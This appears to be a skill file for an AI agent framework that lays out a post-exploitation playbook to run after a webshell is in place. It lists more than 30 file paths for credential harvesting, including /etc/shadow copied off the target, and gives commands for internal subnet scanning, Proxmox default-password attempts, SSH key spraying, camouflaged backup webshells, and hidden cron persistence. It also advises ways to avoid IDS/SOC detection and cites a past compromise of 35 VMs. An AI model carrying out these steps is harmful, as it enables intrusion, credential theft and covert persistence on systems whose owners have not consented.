---
name: vps-hephaestus-post-rce
description: Post-RCE orchestration wrapping Hunter and Navigator agents. Automates internal subnet scan, credential harvest from 30+ locations, PVE/Proxmox detection and pivot, shared hosting lateral movement, and SSH key reuse testing.
---
# /post-rce

Post-exploitation orchestration skill. Wraps Hunter and Navigator agents for
comprehensive post-RCE enumeration, credential harvesting, and lateral movement.

**Key lesson from UT engagement:** 1 shell -> internal scan -> PVE 172.16.85.52 -> 35 VMs.
Shell is the BEGINNING, not the end.

## Arguments

- `<shell_url>` (required) - Active webshell URL with command parameter (e.g., `http://target.com/shell.php?c=`)
- `<target>` (required) - Target domain for campaign tracking
- `<campaign_id>` (optional) - Campaign identifier, defaults to target slug

## Prerequisites

- Confirmed shell access (uid= verified by executing `id` through the tunnel and confirming `uid=` in output)
- GSocket deployed by Anchor agent (Hunter will verify/redeploy if needed)
- After any GSocket deploy or redeploy, uid= MUST be re-verified via `check_tunnel()` before continuing
- Campaign directory exists at `~/Hephaestus/campaigns/<campaign>/`

## Procedure

### Phase 1: Hunter Agent Execution

Reference: `agents/hunter.md`

1. **Cleanup Detection** - Check crontab and /etc/cron.d/ for cleanup scripts.
   If cleanup < 5 minutes: prioritize GSocket persistence immediately.

2. **GSocket Verification** - Verify Anchor's GSocket deployment is live using
   `check_tunnel()` (requires `uid=` in output — TCP ping alone is insufficient).
   Redeploy via webshell if dead (up to 3 attempts with 10s delay between).
   After redeploy, verify crontab entry with `crontab -l | grep '.libsys.so'`.
   All subsequent ops via GSocket tunnel only.

3. **System Enumeration** - Basic system info, users, processes, SUID binaries,
   sudo permissions, capabilities, Docker socket, writable cron/systemd paths.

4. **Credential Harvest** - 30+ locations systematically (minimum baseline):
   - `/etc/passwd`, `/etc/shadow` (save to `/tmp/.shadow.bak` for local cracking)
   - `~/.bash_history`, `~/.mysql_history`, `~/.pgpass`, `~/.psql_history`, `~/.rediscli_history`
   - `/var/www/*/.env`, `/var/www/*/config/*`
   - `/home/*/.ssh/*`, `/root/.ssh/*`
   - Database dumps, WordPress `wp-config.php`
   - Laravel `.env`, Django `settings.py`, Rails `database.yml`
   - `/etc/pure-ftpd/passwd`, `/etc/vsftpd/passwd` (FTP credentials)
   - `/usr/local/cpanel/etc/`, `/var/cpanel/users/*` (cPanel per-user including DBPASS)
   - `/etc/psa/.psa.shadow`, `/usr/local/psa/admin/conf/panel.ini` (Plesk)
   - `/usr/local/directadmin/conf/mysql.conf` (DirectAdmin)
   - `/etc/exim.conf`, `/etc/dovecot/` (mail server auth)
   - `/proc/*/environ` — PHP-FPM/Node workers hold DB_PASSWORD, SECRET_KEY in environment
   - `~/.config/composer/auth.json` (packagist tokens)
   - `/etc/nginx/conf.d/*`, `/etc/apache2/sites-enabled/*`
   - `/opt/plesk/etc/`, `/usr/local/psa/` (Plesk credentials)
   - PM2: `~/.pm2/`, `/home/*/ecosystem.config.js`, `/home/*/.npmrc`
   - Dynamic discovery: `find / -maxdepth 8 -name '*.conf' -o -name '*.ini' -o -name '*.cfg' 2>/dev/null | xargs grep -ilE 'password|passwd|secret' 2>/dev/null | head -40`

   **CRITICAL**: Shadow file MUST be saved to `/tmp/.shadow.bak` on target, then
   exfiltrated to operator machine. Hash cracking (john/hashcat) runs LOCALLY on
   operator machine only — NEVER on the target (CPU spike triggers IDS/SOC alert).

5. **Internal Subnet Scan** - MANDATORY for pivot discovery:
   - Scan directly-connected subnets AND check full private ranges (172.16-31.x.x
     if any 172.x address found locally — do not truncate /16 to a single /24)
   - Target ports (minimum): 22 (SSH), 80 (HTTP), 443 (HTTPS), 2083 (cPanel),
     2222 (DirectAdmin), 3306 (MySQL), 3389 (RDP), 5432 (PostgreSQL), 5900-5910 (VNC),
     6379 (Redis), 8006 (PVE), 8080/8443 (Tomcat/cPanel WHM), 8880 (Plesk),
     8888 (Jupyter), 9200 (Elasticsearch), 11211 (Memcached),
     2375/2376 (Docker API — unauthenticated = direct root), 27017 (MongoDB)
   - Dedicated Docker API check: `curl -sk http://{ip}:2375/containers/json 2>/dev/null | python3 -m json.tool | head -5`

6. **Hash Crack + Key Test** - Shadow exfiltrated first, then crack locally with
   john/hashcat on operator machine. Test SSH private keys for password protection.

7. **Shared Hosting Enumeration** - List co-hosted sites, extract credentials
   from wp-config.php and .env files. Include PM2/Node ecosystem files.

8. **Backup Shell Deployment** - Deploy camouflaged shells (.font.php, .autoload.php)
   to writable directories.
   - Write verify.txt to ALL discovered webroots (dynamic discovery, not hardcoded
     `/var/www/html`): `find /var/www /home -maxdepth 5 \( -name 'index.php' -o -name 'index.html' \) 2>/dev/null | xargs -I{} dirname {} | sort -u`

9. **Privesc Attempts** - Comprehensive coverage:
   - supervisord configs, pkexec (CVE-2021-4034), DirtyPipe (CVE-2022-0847, kernel 5.8-5.16)
   - `getcap -r / 2>/dev/null` — capabilities
   - `ls -la /var/run/docker.sock 2>/dev/null` — Docker socket
   - `id | grep -E 'lxd|docker|disk'` — group memberships
   - `find /etc/cron* /etc/systemd /var/spool/cron -writable 2>/dev/null` — writable cron/systemd
   - `cat /etc/sudoers 2>/dev/null` — sudo misconfigurations
   - SUID binaries from enum step → cross-reference GTFOBins lookup
   - `sudo pm2 start /bin/bash` (check sudo -l output for pm2)
   - NFS no_root_squash: `cat /etc/exports 2>/dev/null`

### Phase 2: Navigator Agent Execution

Spawns when Hunter reports `PIVOT_TARGETS` or co-hosts detected.

Reference: `agents/navigator.md`

1. **PVE/Proxmox Pivot** - Highest ROI target.
   - Try default credentials: password, 123456, admin, proxmox, pve, root
   - On success: list all VMs via pvesh, deploy GSocket to each

2. **SSH Key Reuse** - Spray harvested SSH keys against all pivot targets.
   Test both root and www-data users.
   - Use `find ... -print0 | while IFS= read -r -d '' key; do ...` (NOT unquoted for loop)
   - Quote all `ssh -i "$key"` calls

3. **Database Credential Reuse** - Test harvested DB credentials against
   discovered MySQL/PostgreSQL/MongoDB hosts.

4. **Shared Hosting Symlink Pivot** - If www-data can read other users'
   directories, steal credentials and INTO OUTFILE for new shells.

5. **GSocket Deployment** - Deploy persistence to all successfully pivoted hosts.
   Verify each new tunnel with `check_tunnel()` (uid= required), not TCP ping.

## State Management

Hunter updates `~/Hephaestus/campaigns/{campaign}/state.json`:

```json
{
  "hunter_phase": "complete",
  "gsocket": [{"secret": "Heph1337_...", "status": "live", "cron": true, "cron_verified": true}],
  "creds_harvested": [],
  "root_obtained": false,
  "internal_hosts": [],
  "pve_found": false,
  "verify_txt": "url",
  "pivot_signal": "PIVOT_TARGETS: [ip1, ip2]"
}
```

The `cron_verified` field is set based on actual `crontab -l | grep '.libsys.so'` output,
not assumed. `cron: true` without `cron_verified: true` means deployment ran but was not confirmed.

Navigator updates with:

```json
{
  "navigator_phase": "complete",
  "pve_accessed": false,
  "vms_compromised": 0,
  "ssh_pivoted": ["ip1", "ip2"],
  "symlink_pivoted": ["domain1"],
  "new_shells": [],
  "new_gsocket": [{"ip": "", "secret": "Heph1337_..."}],
  "next": "roaster"
}
```

## Output

- Internal scan results: `/tmp/internal_scan_{target}.txt`
- Shadow file exfil: `/tmp/target_shadow.txt` (operator machine, for local cracking)
- State updates: `~/Hephaestus/campaigns/{campaign}/state.json`
- Final report: max 20 lines summary, details in files

## Constraints

- ALL GSocket ops output: max 10 lines per command
- Do NOT harvest credentials via webshell after GSocket is live
- Report only counts for credentials, not actual values in chat
- Write state.json with Python, not manual file writes
- Hash cracking NEVER runs on target — local operator machine only

## Failure Modes

- **GSocket dead, webshell down**: Mark engagement as persistence-critical,
  attempt recovery via any backup shells
- **No pivot targets**: Complete Hunter phase, skip Navigator, proceed to roaster
- **Cleanup detected**: Prioritize GSocket cron persistence before any enumeration
- **Cron write failed**: Log `cron_verified: false` in state; attempt alternate
  persistence (rc.local, systemd user unit, authorized_keys)
